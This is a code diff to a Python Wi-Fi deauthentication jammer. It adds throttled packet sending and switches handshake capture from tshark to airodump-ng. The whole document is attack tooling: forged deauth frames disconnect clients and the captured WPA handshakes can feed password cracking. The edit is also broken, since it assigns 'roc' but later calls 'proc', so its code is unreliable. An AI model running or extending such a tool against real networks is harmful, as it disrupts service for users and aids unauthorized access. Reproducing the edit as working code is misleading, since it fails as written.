@@ -49,7 +49,9 @@ class DeauthJammer(object):
         capture_filename = "capture_" + str(time.time()) + ".pcap"
         if capture_handshake:
             FNULL = open(os.devnull, 'w')
-            proc = subprocess.Popen(["tshark", "-i", scapy.conf.iface, "-w", capture_filename, "-f", "type mgt"], stdin=None,
+            # proc = subprocess.Popen(["tshark", "-i", scapy.conf.iface, "-w", capture_filename, "-f", "type mgt"], stdin=None,
+            #                        stderr=FNULL, stdout=FNULL, close_fds=True)  # we might add -a as filter for only capturing unassociated clients
+            roc = subprocess.Popen(["airodump-ng", "-c", channel, "-w", capture_filename, scapy.conf.iface], stdin=None,
                                     stderr=FNULL, stdout=FNULL, close_fds=True)  # we might add -a as filter for only capturing unassociated clients
 
         for target in targets:
@@ -65,6 +67,7 @@ class DeauthJammer(object):
                     thread.join(.1)
 
             if capture_handshake:
+                time.sleep(1)
                 proc.terminate()
                 proc.wait()
 
@@ -99,6 +102,9 @@ class DeauthJammer(object):
         for n in range(packet_count) or packet_count == -1:
             if not self._thread_event.isSet():
                 break
+
+            if n % 64 == 0:
+                time.sleep(0.1)
 
             scapy.send(ap_to_client_pckt)
 
